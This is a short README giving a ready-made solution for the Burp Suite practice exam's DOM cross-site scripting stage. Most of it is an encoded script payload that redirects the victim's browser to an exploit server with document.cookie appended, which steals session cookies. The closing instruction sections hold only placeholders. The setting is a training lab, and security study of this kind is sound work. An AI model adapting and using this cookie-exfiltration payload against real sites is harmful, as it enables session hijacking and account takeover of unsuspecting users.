# BurpPracticeExamXSS

https://www.youtube.com/watch?v=fNoX_9v6-aY

Note: the search parameter changes from time to time in the practice exam, so make sure to replace the ?find parameter in the script below to what ever your parameter is

```
<script>
location='https://xxx.web-security-academy.net/?find=burpdomxss%22%2C%22test%22%3A(window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit-xxx%252eweb-security-academy%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D)%7D%2F%2F';
</script>
```

## Where exactly you must input your URL information and search parameter information into this script:

1  -- the place of the URL LAB:
```
?
```
2  -- The pace of the exploit URL server:
```
?
```
3  -- Where you must input your search parameter: 
```
?
```
